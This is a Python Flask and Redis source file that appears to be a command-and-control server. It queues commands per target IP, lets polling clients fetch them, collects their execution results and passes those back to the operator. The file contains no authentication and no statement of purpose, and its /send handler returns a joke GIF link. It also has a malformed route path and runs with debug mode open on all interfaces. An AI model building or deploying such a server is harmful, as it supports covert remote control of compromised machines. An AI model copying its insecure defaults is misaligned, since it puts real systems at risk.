from flask import Flask, request, make_response, Response, jsonify
import redis
import json
import os

app = Flask(__name__)
r = redis.Redis(host='localhost', port=6379)

@app.route('send' , methods=['POST'])
def send():
    ip_address = request.form.get('ip_address')
    command = request.form.get('command')

    r.rpush(f'commands:{ip_address}', command)

    return 'https://media.tenor.com/rcZMAz3r-fQAAAAM/borat-very.gif'
@app.route('/receive', methods=['GET'])
def receive():
    ip_address = request.remote_addr
    # Retrieve commands for the IP address
    commands = r.lrange(f'commands:{ip_address}', 0, -1)

    r.delete(f'commands:{ip_address}')

    return jsonify({'commands': commands})

@app.route('/result', methods=['POST'])
def result():
    ip_address = request.remote_addr
    results = json.loads(request.form.get('results'))

    for result in results:
        r.rpush(f'results:{ip_address}', json.dumps(result))

    return 'Results received successfully'

@app.route('/get_results', methods=['GET'])
def get_results():
    all_results = {}

    ip_addresses = r.keys('results:*')

    for ip_address in ip_addresses:
        ip = ip_address.decode('utf-8').split(':')[1]

        # Retrieve results for the IP address
        results = r.lrange(ip_address, 0, -1)
        results = [json.loads(result) for result in results]

        r.delete(ip_address)
        all_results[ip] = results

    return jsonify(all_results)


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=8000)